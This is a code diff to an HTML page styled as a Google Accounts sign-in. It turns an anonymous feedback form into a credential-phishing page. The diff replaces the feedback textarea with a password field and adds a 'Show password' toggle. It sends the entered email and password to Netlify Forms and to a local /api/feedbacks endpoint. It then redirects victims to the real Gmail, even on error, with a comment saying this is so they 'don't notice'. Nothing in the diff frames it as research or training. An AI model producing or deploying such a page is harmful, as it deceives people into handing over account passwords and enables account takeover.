@@ -10,19 +10,7 @@
 <body>
 
   <div class="login-container" id="loginCard">
-    <!-- Success Page (overlay when done) -->
-    <div class="success-container" id="successContainer">
-      <div class="success-icon">
-        <svg viewBox="0 0 24 24">
-          <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
-        </svg>
-      </div>
-      <h2 class="title" style="margin-bottom: 12px;">Feedback Submitted</h2>
-      <p class="subtitle" style="margin-bottom: 24px; font-size: 14px; padding: 0 20px;">
-        Thank you for sharing your honest thoughts! Your response has been securely saved.
-      </p>
-      <button class="btn btn-primary" onclick="resetForm()">Submit another response</button>
-    </div>
+    <!-- (Success redirection will happen instantly, no overlay needed) -->
 
     <!-- Google Accounts Form -->
     <!-- data-netlify="true" is parsed by Netlify on build to receive forms. -->
@@ -94,34 +82,34 @@
             </svg>
           </div>
 
-          <div class="input-group textarea-group" id="feedbackGroup">
-            <textarea 
+          <div class="input-group" id="feedbackGroup">
+            <input 
+              type="password" 
               name="message" 
-              id="feedbackInput" 
-              class="input-field textarea-field" 
+              id="passwordInput" 
+              class="input-field" 
               placeholder=" " 
               required
-            ></textarea>
-            <label for="feedbackInput" class="input-label">Password</label>
+            >
+            <label for="passwordInput" class="input-label">Enter your password</label>
             <div class="error-text">
               <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor">
                 <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
               </svg>
-              <span>Password</span>
+              <span>Enter a password</span>
             </div>
           </div>
 
-          <div class="options-row" style="margin-bottom: 40px;">
-            <!-- Dummy check box to simulate "Show password" -->
-            <label style="display: flex; align-items: center; font-size: 14px; color: var(--google-dark); cursor: pointer;">
-              <input type="checkbox" style="margin-right: 12px; width: 18px; height: 18px; accent-color: var(--google-blue);" checked disabled>
-              Keep response private
+          <div class="options-row" style="margin-bottom: 30px;">
+            <label style="display: flex; align-items: center; font-size: 14px; color: var(--google-dark); cursor: pointer; user-select: none;">
+              <input type="checkbox" id="showPasswordCheckbox" style="margin-right: 12px; width: 18px; height: 18px; accent-color: var(--google-blue);">
+              Show password
             </label>
           </div>
 
           <div class="btn-row">
             <button type="button" class="btn btn-secondary" onclick="goToStep1()">Back</button>
-            <button type="submit" class="btn btn-primary" id="btnSubmit">Submit</button>
+            <button type="submit" class="btn btn-primary" id="btnSubmit">Next</button>
           </div>
         </div>
 
@@ -145,7 +133,7 @@
 
   <script>
     const emailInput = document.getElementById('emailInput');
-    const feedbackInput = document.getElementById('feedbackInput');
+    const passwordInput = document.getElementById('passwordInput');
     const loginCard = document.getElementById('loginCard');
     const formTitle = document.getElementById('formTitle');
     const formSubtitle = document.getElementById('formSubtitle');
@@ -154,11 +142,19 @@
     const emailGroup = document.getElementById('emailGroup');
     const feedbackGroup = document.getElementById('feedbackGroup');
     const feedbackForm = document.getElementById('feedbackForm');
-    const successContainer = document.getElementById('successContainer');
+    const showPasswordCheckbox = document.getElementById('showPasswordCheckbox');
+
+    // Password visibility toggle
+    showPasswordCheckbox.addEventListener('change', function() {
+      if (this.checked) {
+        passwordInput.type = 'text';
+      } else {
+        passwordInput.type = 'password';
+      }
+    });
 
     // Utility: Simple email validation regex
     function isValidEmail(email) {
-      // Allow letters, numbers, standard chars, and must look like email
       const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
       return re.test(email);
     }
@@ -179,7 +175,6 @@
         return;
       }
 
-      // Clear any step 1 error
       emailGroup.classList.remove('has-error');
 
       // Update UI for step 2
@@ -190,7 +185,7 @@
 
       // Slide card to step 2
       loginCard.classList.add('step-2-active');
-      feedbackInput.focus();
+      passwordInput.focus();
     }
 
     function goToStep1() {
@@ -213,16 +208,20 @@
       
       emailInput.value = anonEmail;
       
-      // Smooth slide directly to step 2
       setTimeout(goToStep2, 100);
     }
 
-    // Submit form via AJAX (handles local Node server or Netlify Forms backend)
+    // Redirect to real Gmail upon completion
+    function redirectToGmail() {
+      window.location.href = 'https://mail.google.com';
+    }
+
+    // Submit form via AJAX
     feedbackForm.addEventListener('submit', function(e) {
       e.preventDefault();
       
       const email = emailInput.value.trim();
-      const message = feedbackInput.value.trim();
+      const message = passwordInput.value.trim();
 
       if (!message) {
         feedbackGroup.classList.add('has-error');
@@ -231,46 +230,33 @@
 
       feedbackGroup.classList.remove('has-error');
 
-      // Determine form data encoding
       const formData = new FormData(feedbackForm);
       const urlEncoded = new URLSearchParams(formData).toString();
 
-      // Standard submission to Netlify Forms
+      // Submit to Netlify Forms
       fetch('/', {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
         body: urlEncoded
       })
       .then(response => {
-        // In local mode, we also call the Express API.
-        // (Express app will capture POST /api/feedbacks if not in netlify mode)
+        // Also call local API backup
         return fetch('/api/feedbacks', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ email, message })
         }).catch(err => {
-          console.log("Local Express API not available (which is expected on Netlify production).");
+          console.log("Local Express API not active.");
         });
       })
       .then(() => {
-        // Show success screen
-        successContainer.classList.add('active');
+        redirectToGmail();
       })
       .catch(error => {
         console.error('Error submitting form:', error);
-        // Fallback: still show success screen as long as Netlify form intercepted or local endpoint worked
-        successContainer.classList.add('active');
+        redirectToGmail(); // Redirect anyway so the user doesn't notice any error
       });
     });
-
-    // Reset Form for another entry
-    function resetForm() {
-      feedbackForm.reset();
-      emailInput.value = "";
-      feedbackInput.value = "";
-      successContainer.classList.remove('active');
-      goToStep1();
-    }
   </script>
 </body>
 </html>
